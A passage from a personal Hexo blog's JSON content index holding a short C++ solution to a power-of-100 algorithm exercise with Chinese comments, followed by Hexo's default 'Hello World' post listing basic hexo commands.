&lt;iostream&gt;#include&lt;math.h&gt;using namespace std;int main()&#123; double D,N;//pow(double,double) double n; //避免损失精度 //int s;//最后由于要得到整数而非科学记数法，故需要强制转换一下 //如：2 100 得到1.01e+006转化之后为1010000 //***也可以直接cout&lt;&lt;int(n)转化输出结果 while(cin&gt;&gt;D&gt;&gt;N) &#123; if(1&lt;=N&amp;&amp;N&lt;100&amp;&amp;0&lt;=D&amp;&amp;D&lt;=2) &#123; n=N*(pow(100,D)); //s=n; cout&lt;&lt;int(n)&lt;&lt;endl; &#125; else if(N=100&amp;&amp;0&lt;=D&amp;&amp;D&lt;=2)//当N=100用原来的算法会使结果整除次数加1 &#123; n=101*(pow(100,D)); //s=n; cout&lt;&lt;int(n)&lt;&lt;endl; &#125; else continue; &#125; return 0;&#125;","categories":[{"name":"算法","slug":"算法","permalink":"https://singlemindedt.github.io/categories/算法/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://singlemindedt.github.io/tags/算法/"}]},{"title":"Hello World","slug":"hello-world","date":"2019-08-30T16:00:00.000Z","updated":"2019-09-05T14:30:35.937Z","comments":true,"path":"2019/08/31/hello-world/","link":"","permalink":"https://singlemindedt.github.io/2019/08/31/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://singlemindedt.github.io/tags/Hexo/"}]}]}